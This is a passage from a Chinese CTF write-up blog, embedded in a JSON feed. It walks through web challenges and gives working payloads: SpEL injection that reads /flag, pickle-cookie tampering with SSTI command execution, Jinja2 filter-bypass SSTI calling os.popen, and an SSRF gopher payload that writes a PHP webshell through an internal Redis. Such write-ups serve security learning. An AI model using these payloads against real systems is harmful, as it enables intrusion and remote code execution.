class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">RecSen</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    Rec<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    Sen<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.archive.xdsec.chall.frankli.site\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">10095</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    RecSen<span class=\"token punctuation\">(</span><span class=\"token string\">\"lubenwei\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    RecSen<span class=\"token punctuation\">(</span><span class=\"token string\">\"9\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    RecSen<span class=\"token punctuation\">(</span><span class=\"token string\">\"1 0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    RecSen<span class=\"token punctuation\">(</span><span class=\"token string\">\"9\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    RecSen<span class=\"token punctuation\">(</span><span class=\"token string\">\"0 1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    Sen<span class=\"token punctuation\">(</span><span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">for</span>  i  <span class=\"token keyword\">in</span>  <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        RecUntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"is \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        num <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        RecSen<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/76767.png\" alt=\"\" /></p>\n<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h1>\n<h2 id=\"java\"><a class=\"anchor\" href=\"#java\">#</a> Java</h2>\n<p>做这道题前，Java 负基础 (啥也不会，甚至怀疑人生) 题目打开给个压缩包，下载下来发现是一个 Java 的小项目的源文件，把每个都打开看看，感觉比较关键的文件是这个</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>controller</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>expression<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ExpressionParser</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>expression<span class=\"token punctuation\">.</span>spel<span class=\"token punctuation\">.</span>standard<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">SpelExpressionParser</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RequestMapping</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RequestParam</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RestController</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HttpServletRequest</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">MalformedURLException</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MainController</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token class-name\">ExpressionParser</span> parser <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SpelExpressionParser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span><span class=\"token annotation punctuation\">@RequestParam</span><span class=\"token punctuation\">(</span>required <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> code<span class=\"token punctuation\">,</span><span class=\"token annotation punctuation\">@RequestParam</span><span class=\"token punctuation\">(</span>required <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> url<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">MalformedURLException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">String</span> requestURI <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getRequestURI</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>requestURI<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">\"nonono\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>code<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span><span class=\"token function\">parseExpression</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token string\">\"so?\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><mark><strong>代码审计</strong></mark> 比较关键的一些知识点如下：</p>\n<ul>\n<li>@RequestMapping('/')</li>\n<li>getRequestURI()</li>\n<li>equals(&quot;/&quot;)</li>\n<li>parser.parseExpression(code).getValue().toString()</li>\n</ul>\n<p><mark><strong>解题思路</strong></mark> 由于代码很少，基础知识了解了，解题的思路也就出来了 首先，题目的描述中给了提示： <code>flag在/flag中</code> ，利用给出的提示，拿到 flag 的方式无非有两种，通过命令执行，如 <code>cat /flag</code> ，或者直接通过文件读取，读取到 <code>/flag</code>  的内容 <code>payload:/?code=T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/flag'), T(java.nio.charset.Charset).defaultCharset())</code></p>\n<p><code>flag:miniL&#123;edd0faa3-c21b-40da-ac82-53bf734299c9&#125;</code></p>\n<h2 id=\"l-inc\"><a class=\"anchor\" href=\"#l-inc\">#</a> L inc.</h2>\n<p>经过一些尝试，得到题目的第一步应该是认证 vip 身份 抓包，看到 cookie 应该是 base64: <code>gASVLAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjANjeXOUjAN2aXCUiXViLg==</code>  用 python 解一下： <code>b'\\x80\\x04\\x95,\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x03app\\x94\\x8c\\x04User\\x94\\x93\\x94)\\x81\\x94&#125;\\x94(\\x8c\\x04name\\x94\\x8c\\x03cys\\x94\\x8c\\x03vip\\x94\\x89ub.'</code>  结合 PHP 序列化的字符串，这个看起来也像是一个序列化字符串 实际上这就是 python 的序列化字符串， <code>cys</code>  前是它的长度 用 python 的 pickletools 处理一下（注意到 \\x89 是 NEWFALSE 尝试一下 \\x90,\\x88）可知 <code>\\x88</code>  是 NEWTRUE 将更改后的字符串 base64encode，作为 cookie 成功认证 vip 身份。</p>\n<p><img data-src=\"https://camo.githubusercontent.com/a54a8521d3be41470b88af434c3f865eec632998acba26f4124f44eaa551cdc7/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f31303636376238663337653937303462393232323333613835636238646465392e706e67\" alt=\"\" /></p>\n<p><img data-src=\"https://camo.githubusercontent.com/cea03f13f57dfd7fa0ef7f0085a808e184a6cd38fcc82cb62b7415ac75e92562/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35326133373537366536373938323535326565383666306534366433663234662e706e67\" alt=\"\" /></p>\n<p>并且可以看到前面的输入回显到了页面上，猜测是 SSTI 输入 <code>&#123;&#123;3*3&#125;&#125;</code>  成功回显 9 这里我做题时没来及的写脚本，所以是直接输入 payload，抓包，改包认证 vip 身份来做题的 paylaod: <strong>查目录</strong>  <code>gASVjwAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGZ7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdscyAvJykucmVhZCgpIikgfX2UjAN2aXCUiHViLg==</code>  <strong>查 flag</strong>  <code>gASVlAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGt7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdjYXQgL2ZsYWcnKS5yZWFkKCkiKSB9fZSMA3ZpcJSIdWIu</code></p>\n<p><img data-src=\"https://camo.githubusercontent.com/0819fd5ce56fd3c39735f814e73c9febc65cf87120f4337880cb7b92021bd606/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f64366433626363643132363539666163316338616132336261636137626136332e706e67\" alt=\"\" /></p>\n<p><img data-src=\"https://camo.githubusercontent.com/a094728e835a53600c499230e9d79adc9aeabc0b9c3ac5e328dbe2897dfdd44d/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f66363762343263616462393535623532373838356237636533396138333765352e706e67\" alt=\"\" /></p>\n<h2 id=\"template\"><a class=\"anchor\" href=\"#template\">#</a> Template</h2>\n<p>看题目名字大概可以确定这是一道模板注入的题目 经过简单的测试，可能是通过 JS 过滤了 <code>'&#123;''&#125;''%'</code> , 想到调试一下题目 JS 代码，看看能否去掉过滤 (这里稍稍与 lt 师傅出题时候的想法不一样，相当于走了个小捷径)， 进入到 JS 的源码部分，直接搜索 <code>&#123;</code> 找到进行过滤的代码位置，这里我设了断点，通过调试大概看了一下 submit 函数的执行流程，从界面直接获取输入，对输入内容进行黑名单搜索，搜到就会调用 alert () 结束代码的继续运行。所以直接把黑名单改掉，这里我直接啥也没过滤。 没有 JS 的过滤了，那么就可以进行模板注入了，首先常规的 <code>&#123;&#123;3*3&#125;&#125;</code>  得到回显 9，应该是 jinja2 的模板注入 经过简单的测试，过滤了 <code>'class','base','subclasses','init','flag','os','.','+','|',单引号</code>  这里‘|’过滤掉相当于过滤器基本用不了了，只能使用常规的 <code>&quot;&quot;.__class__.__base__.__subclasses__()</code>  链条去执行命令，jinja2 有个特性， <code>&quot;&quot;[&quot;__class__&quot;]==&quot;&quot;.__class__</code> ，基于此，可以通过 &quot; 进行字符拼接，利用这个特性绕过。以及关键词的过滤 一开始想着用这个链条 <code> x[&quot;__init__&quot;][&quot;__globals__&quot;][&quot;__getitem__&quot;](&quot;__builtins__&quot;)</code>  去调用命令执行模块，后来发现想的太简单了，可能由于 python 版本等诸多原因，这个 payload 在服务器端是打不通的 之后想通过遍历找到可以执行命令的模块，写了这个 payload: <code>&#123;% for c in \"\"[\"__cl\"\"ass__\"][\"__ba\"\"se__\"][\"__subcl\"\"asses__\"]() %&#125; &#123;% if c[\"__na\"\"me__\"] == \"catch_warnings\" %&#125; &#123;&#123;c[\"__in\"it__\"][\"__getitem__\"][\"__globals__\"][\"__builtins__\"][\"eval\"](\"__import__(\\\"o\\\"\\\"s\\\")[\\\"system\\\"](\\\"ls /\\\")\") &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</code>  但是可能由于相同的原因，这个 payload 也打不通 最后没办法只好通过手撕去查找，题目能利用的模块，我是用这个链条完全的手撕...(主要是最开始做题目虽然走了捷径，但也把思路禁锢在了直接在输入框中进行注入，没有想到抓包，写脚本跑一下) <code>&#123;&#123;\"\"[\"__cl\"\"ass__\"][\"__ba\"\"ses__\"][\"__getitem__\"](0)[\"__subcl\"\"asses__\"]()[0]&#125;&#125;</code>  最后得到</p>\n<p><img data-src=\"https://camo.githubusercontent.com/3a16259342452d62bf8551c04b7536bcbd8c01fc69517409baadf05f7188836a/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f39346633343238386433386461633339303031363733663532643539623634622e706e67\" alt=\"\" /></p>\n<p>找到了可以执行命令的模块就什么都好说了 最终 payload:  <code>&#123;&#123;\"\"[\"__cl\"\"ass__\"][\"__ba\"\"ses__\"][\"__getitem__\"](0)[\"__subcl\"\"asses__\"]()[177][\"__in\"\"it__\"][\"__globals__\"][\"__builtins__\"][\"__import__\"](\"o\"\"s\")[\"popen\"](\"ls /\")[\"read\"]()&#125;&#125;</code></p>\n<p><img data-src=\"https://camo.githubusercontent.com/95edf11f5500aebdce1ca7858d39bddb58fb23887fd238f0bfdceb1d0c1c7bc5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61363062373436393330376134643330356331616535396537393735346665362e706e67\" alt=\"\" /></p>\n<p><code>&#123;&#123;\"\"[\"__cl\"\"ass__\"][\"__ba\"\"ses__\"][\"__getitem__\"](0)[\"__subcl\"\"asses__\"]()[177][\"__in\"\"it__\"][\"__globals__\"][\"__builtins__\"][\"__import__\"](\"o\"\"s\")[\"popen\"](\"cat /f*\")[\"read\"]()&#125;&#125;</code></p>\n<h2 id=\"protocol\"><a class=\"anchor\" href=\"#protocol\">#</a> protocol</h2>\n<p>题目打开，是一个提示可以输入 URL 的框，猜测考察 SSRF 进行简单的手动测试，得到过滤了 <code>file://</code> , <code>dict</code> , <code>localhost</code> , <code>../</code>   <code>file://</code>  被过滤了，可以尝试 <code>file:/</code>  去绕过 POST 传参， <code>url=file:/var/www/html/index.php</code>  得到了页面的源码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">curl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$ch</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_HEADER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'这样子可不行哦'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">curl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'minisecret'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ifconfig eth1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>POST，minisecret 会执行 <code>ifconfig eth1</code> ，让我们查看到相应的网卡信息</p>\n<p><a href=\"https://camo.githubusercontent.com/1b126c33ff8e7b787f2e2d52a0c30c77af3c92a8ea9be27f2e69c228e04b10f6/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f32356130653636356266373539316332616435663465613766646535363334642e706e67\"><img data-src=\"https://camo.githubusercontent.com/1b126c33ff8e7b787f2e2d52a0c30c77af3c92a8ea9be27f2e69c228e04b10f6/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f32356130653636356266373539316332616435663465613766646535363334642e706e67\" alt=\"img\" /></a></p>\n<p>由此也得到了另一台主机的内网地址，访问一下，是可以访问通的，但什么都没有。尝试手动测试一下，同一网段下是否还有其他可访问的主机，172.192.97.3/4/5 都试了一下。可以访问的是 172.192.97.3 <a href=\"https://camo.githubusercontent.com/5eaabf01577300ee2d0ed9a5b0486fb1410402aee12ea8eb3aa4231b07f037b1/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35343233653762306334363139616333333966666465653636306631346236322e706e67\"><img data-src=\"https://camo.githubusercontent.com/5eaabf01577300ee2d0ed9a5b0486fb1410402aee12ea8eb3aa4231b07f037b1/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f35343233653762306334363139616333333966666465653636306631346236322e706e67\" alt=\"img\" /></a></p>\n<p>由于 gopher 协议是没有被过滤的，可以首先测试一下 3306 (mysql) 以及 6379 (redis) 是否开启服务，得到 redis 是有服务的 那么解决办法就是利用 gopher 协议去打 redis，最终得到 flag 起初想写入 Webshell，然后用工具去连接，但这是不行的，已知的 ip 应该是一个内网 ip，无法通过蚁剑等从外部连接 所以就想能否直接在 shell 中通过执行命令把 flag 查出来并回显 运行生成 payload 的工具 <code>gopherus</code> , 写入 <code>&lt;?php system('cat /f*'); ?&gt;</code> (这里基于前几题的 flag 位置进行了一点猜测)</p>\n<p>payload： <code>url=gopher://172.192.97.3:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3F%20system%28%27cat%20/f%2A%27%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></p>\n<p>再利用 SSRF 访问 172.192.97.3/shell.php，成功得到回显</p>\n<p><a href=\"https://camo.githubusercontent.com/cec85a0008cd3a8afbb1e707d6e5dfb34351e6c04482ce64d1e181b99dda64a5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61643965366334393237633731666133313761646338383235353265373761642e706e67\"><img data-src=\"https://camo.githubusercontent.com/cec85a0008cd3a8afbb1e707d6e5dfb34351e6c04482ce64d1e181b99dda64a5/68747470733a2f2f6d642e77616e616e2e776f726c642f75706c6f6164732f75706c6f61645f61643965366334393237633731666133313761646338383235353265373761642e706e67\" alt=\"img\" /></a></p>\n<p>题目思路来源<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1hEU0VDL21vZUNURl8yMDIw\">西电安全协会</span></p>\n",
            "tags": [
                "computer-science",
                "CTF",
                "Reverse",
                "Misc",
                "Web"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/Reverse/reverse2/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/Reverse/reverse2/",
            "title": "学习Reverse2",
            "date_published": "2021-12-13T09:25:15.216Z",
